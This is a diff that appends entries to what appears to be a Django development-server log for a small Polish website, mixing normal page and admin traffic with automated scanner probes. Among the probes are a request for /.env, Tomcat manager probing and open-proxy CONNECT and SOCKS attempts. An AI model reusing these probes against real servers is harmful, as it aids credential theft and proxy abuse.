@@ -2871,3 +2871,908 @@ Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may
 Bad Request: /emalls.ir:443
 [14/Jan/2021 20:09:07] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
 [14/Jan/2021 20:10:35] "GET /kontakt/ HTTP/1.1" 200 3312
+[14/Jan/2021 20:12:57] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 20:13:01] "GET /admin/ HTTP/1.1" 200 7425
+[14/Jan/2021 20:13:05] "GET /admin/pages/messages/ HTTP/1.1" 200 6927
+[14/Jan/2021 20:13:05] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 20:13:50] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Not Found: //static/admin/js/SelectFilter2.js
+[14/Jan/2021 20:16:16] "GET //static/admin/js/SelectFilter2.js HTTP/1.1" 404 3603
+[14/Jan/2021 20:17:03] "GET /admin/auth/user/8/change/ HTTP/1.1" 200 17112
+[14/Jan/2021 20:17:03] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+Not Found: /static
+[14/Jan/2021 20:17:56] "GET /static HTTP/1.1" 404 3522
+[14/Jan/2021 20:18:11] "GET /static/admin HTTP/1.1" 404 1658
+[14/Jan/2021 20:18:20] "GET /static/admin/img/selector-icons.svg HTTP/1.1" 200 3291
+[14/Jan/2021 20:18:23] "GET /static/admin/img HTTP/1.1" 404 1666
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:19:27] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+[14/Jan/2021 20:20:11] "GET /static/AesteticCode_at2y9hS.png HTTP/1.1" 200 163995
+[14/Jan/2021 20:20:29] "GET /static/style.css HTTP/1.1" 200 8418
+[14/Jan/2021 20:20:55] "GET /static/style.css?id=0 HTTP/1.1" 200 8418
+[14/Jan/2021 20:20:58] "GET /static/style.css?id=1 HTTP/1.1" 200 8418
+[14/Jan/2021 20:21:00] "GET /static/style.css?id=3 HTTP/1.1" 200 8418
+[14/Jan/2021 20:21:09] "GET /static/?id=3 HTTP/1.1" 404 1653
+Not Found: /static
+[14/Jan/2021 20:21:12] "GET /static?id=3 HTTP/1.1" 404 3527
+Not Found: /ulabet-admin
+[14/Jan/2021 20:21:46] "GET /ulabet-admin HTTP/1.1" 404 3540
+[14/Jan/2021 20:23:10] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 20:23:11] "GET /static/logo.png HTTP/1.1" 200 200703
+[14/Jan/2021 20:23:37] "GET /?connect=www.google.com HTTP/1.1" 200 3323
+[14/Jan/2021 20:23:41] "GET /?connect=www.google.com HTTP/1.1" 200 3323
+[14/Jan/2021 20:27:07] "GET /admin HTTP/1.1" 301 0
+[14/Jan/2021 20:27:07] "GET /admin/ HTTP/1.1" 302 0
+[14/Jan/2021 20:27:08] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[14/Jan/2021 20:27:08] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[14/Jan/2021 20:27:08] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2138
+[14/Jan/2021 20:27:08] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
+[14/Jan/2021 20:27:08] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18339
+[14/Jan/2021 20:27:08] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[14/Jan/2021 20:27:08] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[14/Jan/2021 20:27:08] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[14/Jan/2021 20:27:08] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[14/Jan/2021 20:27:11] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[14/Jan/2021 20:27:11] "GET /admin/ HTTP/1.1" 200 7425
+[14/Jan/2021 20:27:11] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[14/Jan/2021 20:27:11] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[14/Jan/2021 20:27:11] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[14/Jan/2021 20:27:11] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[14/Jan/2021 20:27:11] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[14/Jan/2021 20:27:13] "GET /admin/pages/messages/ HTTP/1.1" 200 6927
+[14/Jan/2021 20:27:14] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6281
+[14/Jan/2021 20:27:14] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[14/Jan/2021 20:27:14] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+[14/Jan/2021 20:27:14] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[14/Jan/2021 20:27:14] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[14/Jan/2021 20:27:14] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[14/Jan/2021 20:27:14] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[14/Jan/2021 20:27:14] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[14/Jan/2021 20:27:14] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[14/Jan/2021 20:27:14] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[14/Jan/2021 20:27:14] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[14/Jan/2021 20:27:15] "GET /admin/ HTTP/1.1" 200 7425
+[14/Jan/2021 20:27:17] "GET /admin/auth/user/ HTTP/1.1" 200 11980
+[14/Jan/2021 20:27:17] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+[14/Jan/2021 20:27:17] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[14/Jan/2021 20:27:17] "GET /static/admin/img/icon-no.svg HTTP/1.1" 200 560
+[14/Jan/2021 20:27:17] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[14/Jan/2021 20:27:17] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+Not Found: /http:/chek.zennolab.com/proxy.php
+[14/Jan/2021 20:28:46] "GET /http:/chek.zennolab.com/proxy.php HTTP/1.1" 404 3603
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /login
+[14/Jan/2021 20:29:03] "GET /login HTTP/1.0" 400 60880
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /manager/html
+[14/Jan/2021 20:29:04] "GET /manager/html HTTP/1.0" 400 61115
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:29:06] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 20:32:21] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 20:33:41] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+[14/Jan/2021 20:37:43] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 20:37:44] "GET /zajecia/ HTTP/1.1" 200 2395
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:39:06] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Not Found: //www.instagram.com:443
+[14/Jan/2021 20:40:25] "GET //www.instagram.com:443 HTTP/1.1" 404 3570
+Not Found: /www.instagram.com:443
+[14/Jan/2021 20:40:28] "GET /www.instagram.com:443 HTTP/1.1" 404 3567
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 20:43:27] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+[14/Jan/2021 20:43:28] "GET /?www.instagram.com:443 HTTP/1.1" 200 3323
+[14/Jan/2021 20:43:38] "GET /aktualnosci/ HTTP/1.1" 200 2380
+[14/Jan/2021 20:43:51] "GET /aktualnosci?www.instagram.com HTTP/1.1" 301 0
+[14/Jan/2021 20:43:51] "GET /aktualnosci/?www.instagram.com HTTP/1.1" 200 2380
+[14/Jan/2021 20:45:24] "GET /static/favicon.ico HTTP/1.1" 200 200703
+[14/Jan/2021 20:45:52] "GET /zajecia/ HTTP/1.1" 200 2395
+[14/Jan/2021 20:45:53] "GET /static/AesteticCode_at2y9hS.png HTTP/1.1" 200 163995
+[14/Jan/2021 20:45:53] "GET /static/logo.png HTTP/1.1" 200 200703
+[14/Jan/2021 20:45:54] "GET /kontakt/ HTTP/1.1" 200 3312
+[14/Jan/2021 20:45:55] "GET /static/flogo.png HTTP/1.1" 200 34109
+[14/Jan/2021 20:45:55] "GET /static/inslogo.png HTTP/1.1" 200 67317
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:46:30] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+[14/Jan/2021 20:47:38] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+[14/Jan/2021 20:47:54] "GET /admin/ HTTP/1.1" 200 7425
+[14/Jan/2021 20:47:54] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[14/Jan/2021 20:47:54] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2138
+[14/Jan/2021 20:47:54] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[14/Jan/2021 20:47:54] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18339
+[14/Jan/2021 20:47:54] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[14/Jan/2021 20:47:54] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[14/Jan/2021 20:47:54] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[14/Jan/2021 20:47:54] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[14/Jan/2021 20:47:54] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[14/Jan/2021 20:47:54] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[14/Jan/2021 20:47:54] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[14/Jan/2021 20:47:54] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[14/Jan/2021 20:48:03] "GET /admin/pages/lessons/ HTTP/1.1" 200 6693
+[14/Jan/2021 20:48:03] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6281
+[14/Jan/2021 20:48:03] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+[14/Jan/2021 20:48:03] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[14/Jan/2021 20:48:03] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[14/Jan/2021 20:48:03] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[14/Jan/2021 20:48:03] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[14/Jan/2021 20:48:03] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[14/Jan/2021 20:48:03] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[14/Jan/2021 20:48:03] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[14/Jan/2021 20:48:03] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[14/Jan/2021 20:48:04] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[14/Jan/2021 20:48:05] "GET /admin/pages/lessons/1/change/ HTTP/1.1" 200 8925
+[14/Jan/2021 20:48:05] "GET /static/admin/js/calendar.js HTTP/1.1" 200 7788
+[14/Jan/2021 20:48:05] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19750
+[14/Jan/2021 20:48:05] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[14/Jan/2021 20:48:05] "GET /static/admin/css/forms.css HTTP/1.1" 200 8423
+[14/Jan/2021 20:48:05] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+[14/Jan/2021 20:48:05] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[14/Jan/2021 20:48:05] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10592
+[14/Jan/2021 20:48:06] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[14/Jan/2021 20:48:06] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 200 677
+[14/Jan/2021 20:48:14] "GET /admin/pages/texts/ HTTP/1.1" 200 6895
+[14/Jan/2021 20:48:14] "GET /admin/jsi18n/ HTTP/1.1" 200 7748
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:48:49] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 20:52:12] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 20:54:07] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 20:54:31] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+[14/Jan/2021 20:56:48] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 20:56:48] "GET /static/style.css HTTP/1.1" 200 8418
+[14/Jan/2021 20:56:48] "GET /static/logo.png HTTP/1.1" 200 200703
+----------------------------------------
+Exception happened during processing of request from ('89.70.48.20', 63853)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('89.70.48.20', 63852)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('89.70.48.20', 63854)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 21:05:23] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62510
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 21:06:03] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 21:20:45] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 21:22:00] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 21:24:44] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 21:31:49] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 21:36:37] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 21:43:22] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62511
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 21:43:46] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[14/Jan/2021 21:46:09] "GET /.env HTTP/1.1" 400 61345
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Jan/2021 21:46:10] "POST / HTTP/1.1" 400 61628
+Invalid HTTP_HOST header: 'work.a-poster.info:25000'. You may need to add 'work.a-poster.info' to ALLOWED_HOSTS.
+Bad Request: /http:/work.a-poster.info:25000/
+[14/Jan/2021 21:54:13] "POST http://work.a-poster.info:25000/ HTTP/1.1" 400 61703
+[14/Jan/2021 21:54:16] code 400, message Bad request syntax ('\x05\x01\x00')
+[14/Jan/2021 21:54:16] " " 400 -
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 21:57:13] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 22:01:01] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 22:01:26] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 22:05:26] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62510
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.53', 35082)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Jan/2021 22:06:51] "GET / HTTP/1.1" 400 61053
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 22:07:53] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 22:10:42] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+[14/Jan/2021 22:16:53] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 22:16:53] "GET /static/style.css HTTP/1.1" 200 8418
+[14/Jan/2021 22:16:53] "GET /static/logo.png HTTP/1.1" 200 200703
+[14/Jan/2021 22:17:08] "GET / HTTP/1.1" 200 3323
+[14/Jan/2021 22:17:08] "GET /static/style.css HTTP/1.1" 200 8418
+[14/Jan/2021 22:17:08] "GET /static/logo.png HTTP/1.1" 200 200703
+[14/Jan/2021 22:17:10] "GET /static/favicon.ico HTTP/1.1" 200 200703
+[14/Jan/2021 22:17:14] "GET /onas/ HTTP/1.1" 200 6259
+[14/Jan/2021 22:17:14] "GET /static/pDawid.jpg HTTP/1.1" 200 60279
+[14/Jan/2021 22:17:15] "GET /static/pKlaudia.jpg HTTP/1.1" 200 71721
+[14/Jan/2021 22:17:19] "GET /profile/ HTTP/1.1" 302 0
+[14/Jan/2021 22:17:19] "GET /login?next=/profile/ HTTP/1.1" 301 0
+[14/Jan/2021 22:17:20] "GET /login/?next=/profile/ HTTP/1.1" 200 2264
+[14/Jan/2021 22:17:21] "GET /zajecia/ HTTP/1.1" 302 0
+[14/Jan/2021 22:17:21] "GET /login?next=/zajecia/ HTTP/1.1" 301 0
+[14/Jan/2021 22:17:21] "GET /login/?next=/zajecia/ HTTP/1.1" 200 2264
+[14/Jan/2021 22:17:22] "GET /kontakt/ HTTP/1.1" 200 3312
+[14/Jan/2021 22:17:23] "GET /static/inslogo.png HTTP/1.1" 200 67317
+[14/Jan/2021 22:17:23] "GET /static/flogo.png HTTP/1.1" 200 34109
+[14/Jan/2021 22:17:24] "GET /onas/ HTTP/1.1" 200 6259
+[14/Jan/2021 22:17:25] "GET /aktualnosci/ HTTP/1.1" 200 2380
+Invalid HTTP_HOST header: 'mastak.ga'. You may need to add 'mastak.ga' to ALLOWED_HOSTS.
+Bad Request: /http:/mastak.ga/proxy-check.php
+[14/Jan/2021 22:21:08] "POST http://mastak.ga/proxy-check.php HTTP/1.1" 400 61511
+[14/Jan/2021 22:21:13] code 400, message Bad request syntax ('\x05\x01\x00')
+[14/Jan/2021 22:21:13] " " 400 -
+[14/Jan/2021 22:21:18] code 400, message Bad request syntax ('\x04\x01\x00P\\wqx\x00')
+[14/Jan/2021 22:21:18] " P\wqx " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 22:21:50] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 22:26:03] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 22:34:42] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 22:42:09] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 22:43:22] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Jan/2021 22:48:22] "GET / HTTP/1.1" 400 60879
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 22:48:22] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'chekfast.zennolab.com'. You may need to add 'chekfast.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chekfast.zennolab.com/proxy.php
+[14/Jan/2021 23:03:31] "GET http://chekfast.zennolab.com/proxy.php HTTP/1.1" 400 62630
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chek.zennolab.com/proxy.php
+[14/Jan/2021 23:03:49] "GET http://chek.zennolab.com/proxy.php HTTP/1.1" 400 62522
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 23:05:26] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 23:06:50] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chek.zennolab.com/proxy.php
+[14/Jan/2021 23:07:09] "GET http://chek.zennolab.com/proxy.php HTTP/1.1" 400 62526
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /chek.zennolab.com:443
+[14/Jan/2021 23:07:35] "CONNECT chek.zennolab.com:443 HTTP/1.1" 400 61114
